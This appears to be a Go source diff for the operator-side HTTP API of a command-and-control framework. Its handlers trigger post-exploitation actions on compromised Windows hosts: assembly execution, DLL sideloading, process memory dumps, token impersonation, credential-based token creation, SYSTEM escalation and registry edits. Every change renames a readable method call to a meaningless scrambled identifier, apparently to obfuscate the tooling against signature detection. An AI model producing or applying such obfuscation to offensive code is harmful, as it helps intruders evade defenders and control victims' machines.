@@ -195,7 +195,7 @@ func (s *Server) handleIfconfig(w http.ResponseWriter, r *http.Request) {
 	if c == nil {
 		return
 	}
-	ifaces, err := c.Ifconfig(id)
+	ifaces, err := c.Yfgcntaq(id)
 	if err != nil {
 		writeErr(w, http.StatusInternalServerError, err.Error())
 		return
@@ -286,7 +286,7 @@ func (s *Server) handleUnsetEnv(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	key := r.PathValue("key")
-	if err := c.UnsetEnv(id, key); err != nil {
+	if err := c.KnwwtAhb(id, key); err != nil {
 		writeErr(w, http.StatusInternalServerError, err.Error())
 		return
 	}
@@ -366,7 +366,7 @@ func (s *Server) handleRegRead(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	q := r.URL.Query()
-	result, err := c.RegistryRead(id, q.Get("hive"), q.Get("path"), q.Get("key"))
+	result, err := c.JgkiqflyRomf(id, q.Get("hive"), q.Get("path"), q.Get("key"))
 	if err != nil {
 		writeErr(w, http.StatusInternalServerError, err.Error())
 		return
@@ -389,7 +389,7 @@ func (s *Server) handleRegWrite(w http.ResponseWriter, r *http.Request) {
 	if !decodeBody(w, r, &req) {
 		return
 	}
-	if err := c.RegistryWrite(id, req.Hive, req.Path, req.Key, req.Value, req.Type); err != nil {
+	if err := c.JgkiqflyUtepk(id, req.Hive, req.Path, req.Key, req.Value, req.Type); err != nil {
 		writeErr(w, http.StatusInternalServerError, err.Error())
 		return
 	}
@@ -416,7 +416,7 @@ func (s *Server) handleExecAssembly(w http.ResponseWriter, r *http.Request) {
 		writeErr(w, http.StatusBadRequest, "invalid base64 assembly")
 		return
 	}
-	res, err := c.ExecuteAssembly(id, data, req.Args, req.Process)
+	res, err := c.UviysfwQksqwjvi(id, data, req.Args, req.Process)
 	if err != nil {
 		writeErr(w, http.StatusInternalServerError, err.Error())
 		return
@@ -443,7 +443,7 @@ func (s *Server) handleSideload(w http.ResponseWriter, r *http.Request) {
 		writeErr(w, http.StatusBadRequest, "invalid base64 data")
 		return
 	}
-	res, err := c.Sideload(id, data, req.ProcessName, req.Args, req.EntryPoint)
+	res, err := c.Ikjwlast(id, data, req.ProcessName, req.Args, req.EntryPoint)
 	if err != nil {
 		writeErr(w, http.StatusInternalServerError, err.Error())
 		return
@@ -470,7 +470,7 @@ func (s *Server) handleSpawnDll(w http.ResponseWriter, r *http.Request) {
 		writeErr(w, http.StatusBadRequest, "invalid base64 data")
 		return
 	}
-	res, err := c.SpawnDll(id, data, req.ProcessName, req.Args, req.EntryPoint)
+	res, err := c.IneenBfl(id, data, req.ProcessName, req.Args, req.EntryPoint)
 	if err != nil {
 		writeErr(w, http.StatusInternalServerError, err.Error())
 		return
@@ -507,7 +507,7 @@ func (s *Server) handleProcessDump(w http.ResponseWriter, r *http.Request) {
 	if !decodeBody(w, r, &req) {
 		return
 	}
-	res, err := c.ProcessDump(id, req.Pid)
+	res, err := c.HlsycykNmgd(id, req.Pid)
 	if err != nil {
 		writeErr(w, http.StatusInternalServerError, err.Error())
 		return
@@ -526,7 +526,7 @@ func (s *Server) handleImpersonate(w http.ResponseWriter, r *http.Request) {
 	if !decodeBody(w, r, &req) {
 		return
 	}
-	if err := c.Impersonate(id, req.Username); err != nil {
+	if err := c.Yovwrygjszq(id, req.Username); err != nil {
 		writeErr(w, http.StatusInternalServerError, err.Error())
 		return
 	}
@@ -546,7 +546,7 @@ func (s *Server) handleMakeToken(w http.ResponseWriter, r *http.Request) {
 	if !decodeBody(w, r, &req) {
 		return
 	}
-	if err := c.MakeToken(id, req.Username, req.Password, req.Domain); err != nil {
+	if err := c.CcowZacsr(id, req.Username, req.Password, req.Domain); err != nil {
 		writeErr(w, http.StatusInternalServerError, err.Error())
 		return
 	}
@@ -558,7 +558,7 @@ func (s *Server) handleRevToSelf(w http.ResponseWriter, r *http.Request) {
 	if c == nil {
 		return
 	}
-	if err := c.RevToSelf(id); err != nil {
+	if err := c.JgbBmEwlz(id); err != nil {
 		writeErr(w, http.StatusInternalServerError, err.Error())
 		return
 	}
@@ -576,7 +576,7 @@ func (s *Server) handleGetSystem(w http.ResponseWriter, r *http.Request) {
 	if !decodeBody(w, r, &req) {
 		return
 	}
-	if err := c.GetSystem(id, req.HostingProcess); err != nil {
+	if err := c.WgzCwynso(id, req.HostingProcess); err != nil {
 		writeErr(w, http.StatusInternalServerError, err.Error())
 		return
 	}
@@ -658,7 +658,7 @@ func (s *Server) handleRegCreateKey(w http.ResponseWriter, r *http.Request) {
 	if !decodeBody(w, r, &req) {
 		return
 	}
-	if err := c.RegistryCreateKey(id, req.Hive, req.Path, req.Key); err != nil {
+	if err := c.JgkiqflyAtqibcOks(id, req.Hive, req.Path, req.Key); err != nil {
 		writeErr(w, http.StatusInternalServerError, err.Error())
 		return
 	}
@@ -678,7 +678,7 @@ func (s *Server) handleRegDeleteKey(w http.ResponseWriter, r *http.Request) {
 	if !decodeBody(w, r, &req) {
 		return
 	}
-	if err := c.RegistryDeleteKey(id, req.Hive, req.Path, req.Key); err != nil {
+	if err := c.JgkiqflyDojebcOks(id, req.Hive, req.Path, req.Key); err != nil {
 		writeErr(w, http.StatusInternalServerError, err.Error())
 		return
 	}
